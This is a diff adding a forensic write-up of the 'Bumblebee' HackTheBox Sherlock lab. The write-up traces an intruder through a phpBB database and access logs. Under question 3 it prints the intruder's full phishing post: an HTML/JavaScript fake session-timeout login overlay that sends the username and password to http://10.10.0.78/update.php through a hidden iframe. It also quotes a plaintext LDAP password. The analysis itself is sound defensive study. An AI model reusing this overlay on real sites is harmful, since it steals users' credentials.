@@ -3630,6 +3630,110 @@ Acording to the above answer:
 ![image](https://hackmd.io/_uploads/H17R88kvGx.png)
 Answer: `2025-09-03 07:34:30`
 
+### IX. Bumblebee:
+> - Link lab: https://app.hackthebox.com/sherlocks/Bumblebee?tab=play_sherlock
+> - Đề bài: An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.
+
+#### 1. What was the username of the external contractor?
+- Using DB Browser for SQLite to analyse the file `phpbb.sqlite3`:
+![image](https://hackmd.io/_uploads/HkE2-EDDMl.png)
+Find table `phpbb_users`:
+![image](https://hackmd.io/_uploads/By7XQ4vPMg.png)
+Take a closer look to `user_id`, `user_permission`, `user_ip`, `username`, `user_password`, `user_email`, `user_type`, `user_regdate`, `user_lastvisit`.
+Because the description reffered to `external contractor`, meaning that this person is not the internal staff, perhaps that:
+    - This is a new account.
+    - `user_type = 0`, not `= 3` (admin).
+
+- Move to tab `Execute SQL`:
+![image](https://hackmd.io/_uploads/SJz2UEDvfx.png)
+Run the query ordered by the latest registration date. We can see that the username `apoole1` is the people needing to find.
+
+**Answer:** `apoole1`
+
+#### 2. What IP address did the contractor use to create their account?
+At the above question, the `user_ip` is `10.10.0.78`.
+**Answer:** `10.10.0.78`
+
+#### 3. What is the `post_id` of the malicious post that the contractor made?
+In Database Structure, there has table `phpbb_posts`:
+![image](https://hackmd.io/_uploads/rJy9dVwvMe.png)
+We will find the `post_id` that the `post_username` is `apoole1` or being sorted by the latest day:
+![image](https://hackmd.io/_uploads/r1nPiEDvMg.png)
+The `post_id` is `9`, and the `post_text` is:
+``` 
+<div><style>body {    z-index: 100;}.modal {    position:fixed;    top:0;    left:0;    height:100%;    width:100%;    z-index:101;    background-color:white;    opacity:1;}.modal.hidden {    visibility: hidden;}</style><script type="text/javascript">function sethidden(){    const d = new Date();    d.setTime(d.getTime() + (24*60*60*1000));    let expires = "expires="+ d.toUTCString();    document.cookie = "phpbb_token=1;" + expires + ";";    var modal = document.getElementById('zbzbz1234');    modal.classList.add("hidden");}document.addEventListener("DOMContentLoaded", function(event) {    let cookieexists = false;    let name = "phpbb_token=";    let cookies = decodeURIComponent(document.cookie);    let ca = cookies.split(';');    for(let i = 0; i < ca.length; i++)    {        let c = ca[i];        while(c.charAt(0) == ' ')        {            c = c.substring(1);        }        if(c.indexOf(name) == 0) {            cookieexists = true;        }    }    if(cookieexists){        return;    }    var modal = document.getElementById('zbzbz1234');    modal.classList.remove("hidden");});</script><iframe name="hiddenframe" id="hiddenframe" style="display:none"></iframe>    <div class="modal hidden" id="zbzbz1234" onload="shouldshow">    <div id="wrap" class="wrap">        <a id="top" class="top-anchor" accesskey="t"></a>        <div id="page-header">            <div class="headerbar" role="banner">                <div class="inner">                    <div id="site-description" class="site-description">                    <a id="logo" class="logo" href="./index.php" title="Board index"><span class="site_logo"></span></a>                    <h1>forum.forela.co.uk</h1>                    <p>Forela internal forum</p>                    <p class="skiplink"><a href="#start_here">Skip to content</a></p>                </div>                    <div id="search-box" class="search-box search-header" role="search">                    <form action="./search.php" method="get" id="search1">                    <fieldset>                        <input name="keywords" id="keywords1" type="search" maxlength="128" title="Search for keywords" class="inputbox search tiny" size="20" value="" placeholder="Search…">                        <button class="button button-search" type="submit" title="Search">                            <i class="icon fa-search fa-fw" aria-hidden="true"></i><span class="sr-only">Search</span>                        </button>                        <a href="./search.php" class="button button-search-end" title="Advanced search">                            <i class="icon fa-cog fa-fw" aria-hidden="true"></i><span class="sr-only">Advanced search</span>                        </a>                    </fieldset>                    </form>                </div>                    </div>            </div>    <div class="navbar" role="navigation">        <div class="inner">            <ul id="nav-main" class="nav-main linklist" role="menubar">                <li id="quick-links" class="quick-links dropdown-container responsive-menu" data-skip-responsive="true">                <a href="#" class="dropdown-trigger dropdown-toggle">                    <i class="icon fa-bars fa-fw" aria-hidden="true"></i><span>Quick links</span>                </a>                <div class="dropdown">                    <div class="pointer"><div class="pointer-inner"></div></div>                    <ul class="dropdown-contents" role="menu">                                <li class="separator"></li>                                <li>                                    <a href="./search.php?search_id=unanswered" role="menuitem">                                        <i class="icon fa-file-o fa-fw icon-gray" aria-hidden="true"></i><span>Unanswered topics</span>                                    </a>                                </li>                                <li>                                    <a href="./search.php?search_id=active_topics" role="menuitem">                                        <i class="icon fa-file-o fa-fw icon-blue" aria-hidden="true"></i><span>Active topics</span>                                    </a>                                </li>                                <li class="separator"></li>                                <li>                                    <a href="./search.php" role="menuitem">                                        <i class="icon fa-search fa-fw" aria-hidden="true"></i><span>Search</span>                                    </a>                                </li>                            <li class="separator"></li>                        </ul>                </div>            </li>                <li data-skip-responsive="true">                <a href="/phpBB3/app.php/help/faq" rel="help" title="Frequently Asked Questions" role="menuitem">                    <i class="icon fa-question-circle fa-fw" aria-hidden="true"></i><span>FAQ</span>                </a>                            <li class="rightside" data-skip-responsive="true">                <a href="./ucp.php?mode=login" title="Login" accesskey="x" role="menuitem">                    <i class="icon fa-power-off fa-fw" aria-hidden="true"></i><span>Login</span>                </a>            </li>                <li class="rightside" data-skip-responsive="true">                    <a href="./ucp.php?mode=register" role="menuitem">                        <i class="icon fa-pencil-square-o  fa-fw" aria-hidden="true"></i><span>Register</span>                    </a>                </li>        </li data-skip-responsive="true"></ul>            <ul id="nav-breadcrumbs" class="nav-breadcrumbs linklist navlinks" role="menubar">            <li class="breadcrumbs" itemscope="" itemtype="http://schema.org/BreadcrumbList" style="max-width: 936px;">                    <span class="crumb" itemtype="http://schema.org/ListItem" itemprop="itemListElement" itemscope=""><a href="./index.php" itemtype="https://schema.org/Thing" itemprop="item" accesskey="h" data-navbar-reference="index" title="Board index"><i class="icon fa-home fa-fw"></i><span itemprop="name">Board index</span></a><meta itemprop="position" content="1"></span>                </li>                    <li class="rightside responsive-search">                    <a href="./search.php" title="View the advanced search options" role="menuitem">                        <i class="icon fa-search fa-fw" aria-hidden="true"></i><span class="sr-only">Search</span>                    </a>                </li>        </ul>            </div>    </div>        </div>                <a id="start_here" class="anchor"></a>        <div id="page-body" class="page-body" role="main">                <div class="panel">                <div class="inner">                        <div class="content">                    <h3>Session Timeout</h3>		    <br/>		    <br/>                    <p>Your session token has timed out in order to proceed you must login again.</p>                </div>                        </div>            </div>    <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">    <div class="panel">        <div class="inner">            <div class="content">            <h2 class="login-title">Login</h2>                <fieldset class="fields1">            <dl>                <dt><label for="username">Username:</label></dt>                <dd><input type="text" tabindex="1" name="username" id="username" size="25" value="" class="inputbox autowidth"></dd>            </dl>            <dl>                <dt><label for="password">Password:</label></dt>                <dd><input type="password" tabindex="2" id="password" name="password" size="25" class="inputbox autowidth" autocomplete="off"></dd>            </dl>            <dl>    <dd><label for="autologin"><input type="checkbox" name="autologin" id="autologin" tabindex="4">Remember me</label></dd>			<dd><label for="viewonline"><input type="checkbox" name="viewonline" id="viewonline" tabindex="5">Hide my online status this session</label></dd>            </dl>                <dl>                <dt>&nbsp;</dt>                <dd>    <input type="submit" name="login" tabindex="6" value="Login" class="button1" onclick="sethidden()"></dd>            </dl>                    </fieldset class="fields1"></div>            </div>    </div>        </form>            </div>            <div id="page-footer" class="page-footer" role="contentinfo">    <div class="navbar" role="navigation">        <div class="inner">            <ul id="nav-footer" class="nav-footer linklist" role="menubar">            <li class="breadcrumbs">    <span class="crumb"><a href="./index.php" data-navbar-reference="index" title="Board index"><i class="icon fa-home fa-fw" aria-hidden="true"></i><span>Board index</span></a></span>		</li>                <li class="responsive-menu hidden rightside dropdown-container"><a href="javascript:void(0);" class="js-responsive-menu-link responsive-menu-link dropdown-toggle"><i class="icon fa-bars fa-fw" aria-hidden="true"></i></a><div class="dropdown"><div class="pointer"><div class="pointer-inner"></div></div><ul class="dropdown-contents"></ul></div></li><li class="rightside">All times are <span title="UTC">UTC</span></li>                <li class="rightside">                    <a href="./ucp.php?mode=delete_cookies" data-ajax="true" data-refresh="true" role="menuitem">                        <i class="icon fa-trash fa-fw" aria-hidden="true"></i><span>Delete cookies</span>                    </a>                </li>        </ul>            </div>    </div>            <div class="copyright">            <p class="footer-row">                <span class="footer-copyright">Powered by <a href="https://www.phpbb.com/">phpBB</a>® Forum Software © phpBB Limited</span>            </p>            <p class="footer-row">                <a class="footer-link" href="./ucp.php?mode=privacy" title="Privacy" role="menuitem">                    <span class="footer-link-text">Privacy</span>                </a>                |                <a class="footer-link" href="./ucp.php?mode=terms" title="Terms" role="menuitem">                    <span class="footer-link-text">Terms</span>                </a>            </p>        </div>            <div id="darkenwrapper" class="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">            <div id="darken" class="darken">&nbsp;</div>        </div>            <div id="phpbb_alert" class="phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">            <a href="#" class="alert_close">                <i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>            </a>            <h3 class="alert_title">&nbsp;</h3><p class="alert_text"></p>        </div>        <div id="phpbb_confirm" class="phpbb_alert">            <a href="#" class="alert_close">                <i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>            </a>            <div class="alert_text"></div>        </div>    </div>        </div>        <div>        <a id="bottom" class="anchor" accesskey="z"></a>    <img src="./cron.php?cron_type=cron.task.core.tidy_warnings" width="1" height="1" alt="cron"></div></div><span>Greetings everyone,<br>	<br>	I am just a visiting IT Contractor, it's a fantastic company y'all have here.<br>	I hope to work with you all again soon.<br>	<br>	Regards,<br>Alex Poole</span></div>
+```
+The above code is a **Phishing/Clickjacking** script by **Fake Overlay/Modal** to steal user registry accounts.
+
+**Answer:** `9`
+
+#### 4. What is the full URI that the credential stealer sends its data to?
+In the `post_text`, we see a link, it is `http://10.10.0.78/update.php`.
+**Answer:** `http://10.10.0.78/update.php`
+
+#### 5. When did the contractor log into the forum as the administrator? (UTC)
+I run this query but there is no result related the external contractor:
+![image](https://hackmd.io/_uploads/H16cgHPvze.png)
+In table `phpbb_sessions`:
+![image](https://hackmd.io/_uploads/r14AxHwwzl.png)
+Run this query:
+![image](https://hackmd.io/_uploads/SyCZZHDvzl.png)
+It can easily see that the `session_ip` is the IP of the external contractor. But `26/04/2023 11:01:53` is not the correct answer :)
+Try another way, in `access.log`, I filtered keyword `login`, then I saw this:
+![image](https://hackmd.io/_uploads/Sk6xNrvvMl.png)
+There is a line having status `302`. I didn't know if this is addmin account, show I checked in DB Browser:
+![image](https://hackmd.io/_uploads/HJQkSBwvfe.png)
+There is no result. I tried entering `25/04/2023 12:15:48` to the answer box, but it was wrong. I searched for the keyword `302`, and I saw this:
+![image](https://hackmd.io/_uploads/r1XqLSDwfe.png)
+
+**Answer:** `26/04/2023 10:53:12`
+
+#### 6. In the forum there are plaintext credentials for the LDAP connection, what is the password?
+> **LDAP** atands for for **Lightweight Directory Access Protocol**. This is a network protocol used to access, search and manage the information of user, computer or other information in centralised network system.
+
+In table `phpbb_config`:
+![image](https://hackmd.io/_uploads/SyLzcSPwzg.png)
+This table stores values in name and value pairs. Run a query:
+![image](https://hackmd.io/_uploads/HyTt5BDDfx.png)
+The password is `Passw0rd1`.
+
+**Answer:** `Passw0rd1`
+
+#### 7. What is the user agent of the Administrator user?
+Filter keyword `302` in `access.log` to find the IP address of admin (not contractor), I saw this:
+![image](https://hackmd.io/_uploads/HyUpoJdvzg.png)
+His IP is `10.255.254.2`, and the user agent of him is `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36`.
+
+**Answer:** `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36`
+
+#### 8. What time did the contractor add themselves to the Administrator group? (UTC)
+> When adding someone to admin group, the system will log this action in the following format:
+`POST /adm/index.php?i=acp_groups&mode=manage&...`
+or
+`POST /adm/index.php?i=acp_users&mode=groups&u=<user_id>`
+
+Run this query to confirm whether the contractor added themselves to admin group:
+![image](https://hackmd.io/_uploads/BJxYJgdvfg.png)
+There has username `apoole`. Then, filter the keyword `acp_groups` in `access.log`:
+![image](https://hackmd.io/_uploads/rJKkCkdwzg.png)
+- At `11:53:34` - GET `acp_groups&mode=manage`: Access to the Group management page.
+- At `11:53:37` - GET `...action=list&g=5`: Display the group having ID `5` (the default ID of admin group).
+- At `11:53:51` — POST `acp_groups&mode=manage&g=5`: A request to submit form to add user into admin group.
+- At `11:53:54` - GET `...action=list&g=5`: Reload the page to confirm the list of admin user after updating.
+
+**Answer:** `26/04/2023 10:53:51`
+
+#### 9. What time did the contractor download the database backup? (UTC)
+![image](https://hackmd.io/_uploads/H1mXfeOwMe.png)
+In the above log, it tooks about 2 minutes (from `11:54:30` to `11:56:28`) to download the database backup whose size is `2474` bytes. I thinked that this is the answer but it was not. Then I saw this:
+![image](https://hackmd.io/_uploads/SJfHK1dwGe.png)
+This database backup has a particular name, so I thinked that this maybe the correct answer.
+Answer: `26/04/2023 11:01:38`
+
+#### 10. What was the size in bytes of the database backup as stated by `access.log`?
+The size of `backup_1682506471_dcsr71p7fyijoyq8.sql.gz` is `34707` bytes.
+Answer: `34707`
+
 ## DFIR-LAB:
 > Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS
 
